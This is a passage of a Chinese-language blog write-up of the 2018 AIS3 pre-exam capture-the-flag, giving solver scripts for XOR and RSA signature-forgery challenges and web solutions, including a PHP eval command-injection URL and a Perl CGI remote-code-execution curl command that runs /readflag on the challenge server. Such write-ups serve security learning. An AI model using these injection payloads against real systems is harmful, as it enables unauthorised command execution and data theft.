+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = key[:<span class="number">5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> trial <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> chr(trial^ord(cipher[<span class="number">-6</span>+i])) == key[<span class="number">-1</span>]:</span><br><span class="line">            key += chr(trial)</span><br><span class="line">            <span class="keyword">print</span> trial</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">flag = <span class="string">''</span>.join(map(chr,[ ord(cipher[i])^ord(key[i%len(key)]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)) ])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{captAIn aMeric4 - Wh4T3V3R HapPenS t0mORr0w YOU mUst PR0Mis3 ME on3 tHIng. TH4T yOu WiLL stAY Who Y0U 4RE. Not A pERfect sO1dIER, buT 4 gOOD MAn.}</strong></p>
+<hr>
+<h1 id="Crypto-3-IOU"><a href="#Crypto-3-IOU" class="headerlink" title="Crypto-3:IOU"></a>Crypto-3:IOU</h1><p>這題用 RSA 來 sign 一個借據，sign 跟 encrypt 的差別在於：sign 用私鑰加密即$m^{d} \equiv c;mod;N$，encrypt 用公鑰加密即$m^{e} \equiv c;mod;N$，所以這裡的 sign 其實沒用什麼特別的算法，官方也不推薦直接使用 sign ，應該要用 PKCS 之類的東西來簽才對</p>
+<p>這題的問題在於，他沒有驗證全部的訊息，他直接 split 找第四個元素，看他是不是 10，因此我們只要造假一個第四個元素 &gt; 10 的明文就好了，要造假簽章我們要通過<code>key.verify</code>，但是因為我們有公鑰 (N, e)，我們可以逆過來玩，只要隨便亂弄一個密文<code>s</code>，就可以得到一個亂七八糟的明文 m = ($s^e$ mod N)，這東西一定會通過<code>key.verify</code>，然後有沒有通過 &gt; 10 就是靠運氣，所以一直撞到過就會有 flag 了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_s = <span class="string">""</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cc = int(<span class="string">''</span>.join(c))</span><br><span class="line">        m = pow(cc, e, n)</span><br><span class="line">        test = long_to_bytes(m)</span><br><span class="line">        bucks = int(test.split()[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">print</span> bucks,</span><br><span class="line">        <span class="keyword">if</span> bucks &gt; <span class="number">10</span>:</span><br><span class="line">            fake_s = str(cc)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    c += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> str(m)</span><br><span class="line"><span class="keyword">print</span> fake_s </span><br><span class="line"><span class="keyword">print</span> <span class="string">"find"</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{D0cT0R StRaNG3 - F0rgERy ATTaCk Ag4InsT RSa DIgital SigNatUrE}</strong></p>
+<hr>
+<h1 id="Crypto-4-EFAIL"><a href="#Crypto-4-EFAIL" class="headerlink" title="Crypto-4:EFAIL"></a>Crypto-4:EFAIL</h1><p>這題腳本寫到一半，總之利用 CBC 的弱點，在知道明文的情況下，我們可以替換密文來修改明文，例如我們有 $C_0, P_1, Fake$，我們把本來$C_0$的地方替換成$C_0 \oplus P_1 \oplus Fake$，這樣$C_1$解密完後會 xor 到錯誤的值，讓本來的 $C_0\oplus P_1$無法還原成$P_1$而變成$Fake$，然後他有提供<code>web</code>這個上網的指令，把flag前面改成<code>web &#39;mydoman.tw</code>，我們就可以去自己的 domain 撈到 flag，注意到後面過幾行有句英文有<code>&#39;</code>，他會把這整段都當網址訪問，所以不用自己再加一個<code>&#39;</code>來閉合</p>
+<hr>
+<h1 id="Web-1-warmup"><a href="#Web-1-warmup" class="headerlink" title="Web-1:warmup"></a>Web-1:warmup</h1><p>連到 <a href="http://104.199.235.135:31331/index.php\?p=7" target="_blank" rel="noopener">http://104.199.235.135:31331/index.php\?p=7</a> 發現 header 裡面有一欄 <code>Partial-Flag:d</code>，推測 URL 裡面的 p 表示是 flag 中的第 p 個字元，所以變動 index 拼出 flag</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..50&#125;</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    curl -v http://104.199.235.135:31331/index.php\?p\=<span class="variable">$i</span> 2&gt;&amp;1 | grep Flag | awk <span class="string">'&#123;printf $3&#125;'</span> | tr -d <span class="string">'\r'</span> &gt;&gt; flag.txt </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><strong>AIS3{g00d! u know how 2 check H3AD3R fie1ds.}</strong></p>
+<hr>
+<h1 id="Web-2-hidden"><a href="#Web-2-hidden" class="headerlink" title="Web-2:hidden"></a>Web-2:hidden</h1><p>先到 <code>robots.txt</code> 會找到一個連結叫做 <code>_hidden_flag_.php</code><br>他會倒數個 1x 秒然後跳出一個按鈕到下一頁<br>他其實送出了一個有兩個隱藏欄位 <code>c</code>，<code>s</code> 的表單，用來取得下次的 <code>c</code>，<code>s</code>值，直到某個關鍵點就會給 flag 了<br>寫個腳本讓他飛一會兒，要跑 17xxx 次才結束</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">"http://104.199.235.135:31332/_hidden_flag_.php"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="string">"no flag here"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    m = re.findall(<span class="string">'value="([A-Za-z0-9]*)"'</span>,r.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">    r = requests.post(<span class="string">'http://104.199.235.135:31332/_hidden_flag_.php'</span>, data = &#123;<span class="string">'c'</span>:m[<span class="number">0</span>],<span class="string">'s'</span>:m[<span class="number">1</span>]&#125;)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>  r.headers</span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{g00d_u_know_how_2_script_4_W3B_3e02c41e2d6243765575b12442bc8480}</strong></p>
+<h1 id="Web-3-sushi"><a href="#Web-3-sushi" class="headerlink" title="Web-3:sushi"></a>Web-3:sushi</h1><p>題目是 <code>php</code>，關鍵的一行是他用<code>eval</code>包住了<code>die</code>，這裡我們可以用 php 神秘的特性，參考 Orange 的 <a href="http://blog.orange.tw/2012/11/phpconf-2012-security-in-php.html" target="_blank" rel="noopener">blog</a><br>其中<code>@</code>是用來抑制錯誤訊息，然後有限制字串長度不能超過 16 ，而且不可以包含 <code>&#39;</code>，<code>&quot;</code><br>先看目錄下有什麼檔案</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;?%F0%9F%8D%A3&#x3D;$&#123;@print(&#96;ls&#96;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>目錄下有 <code>phpinfo.php</code>，<code>index.php</code>，<code>flag_name_1s_t00_l0ng_QAQQQQQQ</code>，這邊用低端解法，直接存取XDDD</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;flag_name_1s_t00_l0ng_QAQQQQQQ</span><br></pre></td></tr></table></figure>
+<p>不過如果不幸的不能直接存取，其實可以用截斷的方式來讓 php 誤判我們放進去 GET 的字串長度，來進行任意長度的 command injection</p>
+<p><strong>AIS3{php_is_very_very_very_easyyyyyy}</strong></p>
+<h1 id="Web-4-perljam"><a href="#Web-4-perljam" class="headerlink" title="Web-4:perljam"></a>Web-4:perljam</h1><p>這題看起來空空如也，不過有 git leak 的問題，總之抓下來會找到一段關鍵的 upload 程式碼</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi = CGI-&gt;new;</span><br><span class="line"><span class="keyword">print</span> $cgi-&gt;header();</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;body style=\"background: #caccf7 url('https://i.imgur.com/Syv2IVk.png');padding: 30px;\"&gt;"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;p style='color:red'&gt;No BUG Q_____Q&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>( $cgi-&gt;upload(<span class="string">'file'</span>) ) &#123;</span><br><span class="line">        <span class="keyword">my</span> $file = $cgi-&gt;param(<span class="string">'file'</span>);</span><br><span class="line">        <span class="keyword">while</span>(&lt;$file&gt;) &#123;</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"$_"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br></pre></td></tr></table></figure>
+<p>可以參考 black hat 的一個<a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf" target="_blank" rel="noopener">簡報</a>，我們可以造假一個 file 來做到 RCE<br>本題不能直接<code>cat flag</code>，權限不夠，在根目錄下面有支可以讀取 flag 的程式，我們要執行他來取得 flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;trash&quot; | curl -F &quot;file&#x3D;ARGV&quot; -F &quot;file&#x3D;@-&quot; &quot;http:&#x2F;&#x2F;104.199.235.135:31334&#x2F;cgi-bin&#x2F;index.cgi?&#x2F;readflag|&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{here_is_your_flag}</strong></p>
+<hr>
+<h1 id="Misc-1-welcome"><a href="#Misc-1-welcome" class="headerlink" title="Misc-1:welcome"></a>Misc-1:welcome</h1><p>看教學影片，裡面有 flag</p>
+<p><strong>AIS3{Maybe_This_is_the_Flag_You_Want}</strong></p>
+<hr>
+<h1 id="Misc-2-flag"><a href="#Misc-2-flag" class="headerlink" title="Misc-2:flag"></a>Misc-2:flag</h1><p>三隻假 flag，圖片上的，strings 出來的， pkcrack 出來的都是假的。<br>本來就覺得他給的圖上的點點看起來很不整齊，猜測是摩斯電碼，吃完晚餐回來一下就過了，不過圖片是 jpeg 壓縮的關係有點模糊，總之對著翻譯出來就是 flag</p>
+<p><strong>AIS3{YOUFINDTHEREALFLAGOHYEAH}</strong></p>
+<hr>
+<h1 id="Misc-3-svega"><a href="#Misc-3-svega" class="headerlink" title="Misc-3:svega"></a>Misc-3:svega</h1><p>mp3 音訊隱寫，用 <a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" rel="noopener">MP3stego</a> 加密的，沒有設定 password ，decode 下去就是 flag</p>
+<p><strong>AIS3{I_HearD_imPlIeD_Fl46_1N_TH3_5oN6}</strong></p>
+<hr>
+<h1 id="Misc-4-blind"><a href="#Misc-4-blind" class="headerlink" title="Misc-4:blind"></a>Misc-4:blind</h1><p>這題還沒來得及想，聽 Maojui 講了個大概，是有趣的一題。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Original Author: <a href="http://blog.terrynini.tw">Terrynini</a>
+            <p>Original link: <a href="http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/">http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/</a>
+            <p>Publish at: <a href="http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/">June 13th 2018, 11:20:22</a>
+            <p>Copyright: This article is licensed under <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/en/2018-RealWorldCTF-Qual/" title= "2018::RealWorldCTF::Qual">
+                    <div class="nextTitle">2018::RealWorldCTF::Qual</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/tw/OS-NachOS-HW1/" title= "OS::NachOS::HW1">
+                    <div class="prevTitle">OS::NachOS::HW1</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    
+    <div id="disqus_thread"></div>
+    <script>
+        /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        
+        var disqus_config = function () {
+        this.page.url = "http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "2018::AIS3::pre-exam"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        
+        (function () { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://terrynini.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
+
+
+    </style>
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- mermaid-->
+    
+      <script src="https://unpkg.com/mermaid@8.4.6/dist/mermaid.min.js"></script>
+      <script>mermaid.initialize({startOnLoad:true});</script>
+      
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:terrynini38514@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/terrynini" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//www.facebook.com/profile.php?id=100001963625238" class="iconfont-archer facebook" target="_blank" title=facebook></a>
+            
+        
+    
+        
+            
+                <a href="//twitter.com/terrynini38514" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//www.linkedin.com/in/%E5%BB%B7%E5%AE%87-%E9%99%B3-bb1b21140/" class="iconfont-archer linkedin" target="_blank" title=linkedin></a>
+            
+        
+    
+        
+            
+                <a href="https://speakerdeck.com/terrynini" class="iconfont-archer others" target="_blank" title=others></a>
+            
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Rev-1-find"><span class="toc-number">1.</span> <span class="toc-text">Rev-1:find</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rev-2-secret"><span class="toc-number">2.</span> <span class="toc-text">Rev-2:secret</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rev-3-crackme"><span class="toc-number">3.</span> <span class="toc-text">Rev-3:crackme</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rev-4-calc"><span class="toc-number">4.</span> <span class="toc-text">Rev-4:calc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-1-mail"><span class="toc-number">5.</span> <span class="toc-text">Pwn-1:mail</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-2-darling"><span class="toc-number">6.</span> <span class="toc-text">Pwn-2:darling</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-3-justfmt"><span class="toc-number">7.</span> <span class="toc-text">Pwn-3:justfmt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-4-MagicWorld"><span class="toc-number">8.</span> <span class="toc-text">Pwn-4:MagicWorld</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto-1-POW"><span class="toc-number">9.</span> <span class="toc-text">Crypto-1:POW</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto-2-XOR"><span class="toc-number">10.</span> <span class="toc-text">Crypto-2:XOR</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto-3-IOU"><span class="toc-number">11.</span> <span class="toc-text">Crypto-3:IOU</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto-4-EFAIL"><span class="toc-number">12.</span> <span class="toc-text">Crypto-4:EFAIL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-1-warmup"><span class="toc-number">13.</span> <span class="toc-text">Web-1:warmup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-2-hidden"><span class="toc-number">14.</span> <span class="toc-text">Web-2:hidden</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-3-sushi"><span class="toc-number">15.</span> <span class="toc-text">Web-3:sushi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-4-perljam"><span class="toc-number">16.</span> <span class="toc-text">Web-4:perljam</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-1-welcome"><span class="toc-number">17.</span> <span class="toc-text">Misc-1:welcome</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-2-flag"><span class="toc-number">18.</span> <span class="toc-text">Misc-2:flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-3-svega"><span class="toc-number">19.</span> <span class="toc-text">Misc-3:svega</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-4-blind"><span class="toc-number">20.</span> <span class="toc-text">Misc-4:blind</span></a></li></ol>
+    </div>
+
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 38
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2022 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/en/2022-BalsnCTF-ProjectO-Write-up/" >2022::BalsnCTF::ProjectO Write-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href= "/en/2021-Flare-On-8-Write-up/" >2021::Flare-On 8::Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/en/2021-QEMU-AFL-and-TCG/" >2021::QEMU::AFL++ and TCG</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/17</span><a class="archive-post-title" href= "/tw/2021-OSCP-%E5%9B%9E%E9%A1%A7%E8%88%87%E5%88%86%E4%BA%AB/" >2021::OSCP::回顧與分享</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/22</span><a class="archive-post-title" href= "/tw/2020-Flare-On-7-Write-up/" >2020::Flare-On 7::Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/" >2020::程式安全::HW0 Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/29</span><a class="archive-post-title" href= "/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/" >2020::AIS3::前測官方解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/28</span><a class="archive-post-title" href= "/tw/TIL-AVX-Base64/" >TIL::AVX Base64</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW4-Write-up/" >程式安全::HW4 Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href= "/en/2019-Flare-On-6-Record/" >2019::Flare-On 6::Record</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href= "/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW3-Write-up/" >程式安全::HW3 Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/tw/TIL-Windows-Services-Debug/" >TIL::Windows Services Debug</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/tw/2019-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/" >2019::AIS3::前測官方解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/01</span><a class="archive-post-title" href= "/en/2019-PlaidCTF/" >2019::PlaidCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/tw/TIL-%E6%94%BB%E6%93%8ALCG-%E7%B7%9A%E6%80%A7%E5%90%8C%E9%A4%98%E7%94%9F%E6%88%90%E5%99%A8/" >TIL::攻擊LCG(線性同餘生成器)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href= "/en/2019-0CTF-Quals-Sanitize/" >2019::0CTF::Quals::Sanitize</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href= "/tw/TIL-%E5%88%A9%E7%94%A8-Chakra-JIT-%E7%B9%9E%E9%81%8E-DEP-%E5%92%8C-CFG/" >TIL::利用 Chakra JIT 繞過 DEP 和 CFG</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href= "/en/2019-CONFidence/" >2019::CONFidence</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/tw/TIL-FaceBook-GIF-memory-exposure/" >TIL::FaceBook_GIF_memory_exposure</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/en/2019-PragyanCTF/" >2019::PragyanCTF</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/tw/2018-Reversing-KR-Record/" >2018::Reversing.KR::Record</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/en/2018-RealWorldCTF-Qual/" >2018::RealWorldCTF::Qual</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/13</span><a class="archive-post-title" href= "/tw/2018-AIS3-pre-exam/" >2018::AIS3::pre-exam</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/tw/OS-NachOS-HW1/" >OS::NachOS::HW1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/04</span><a class="archive-post-title" href= "/en/2018-ASIS-Quals-reverse/" >2018::ASIS-Quals::reverse</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/02</span><a class="archive-post-title" href= "/en/2018-0CTF-Quals-g0g0g0/" >2018::0CTF-Quals::g0g0g0</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework5/" >Advance-Algorithm::homework5</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework6/" >Advance-Algorithm::homework6</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework7/" >Advance-Algorithm::homework7</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework4/" >Advance-Algorithm::homework4</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
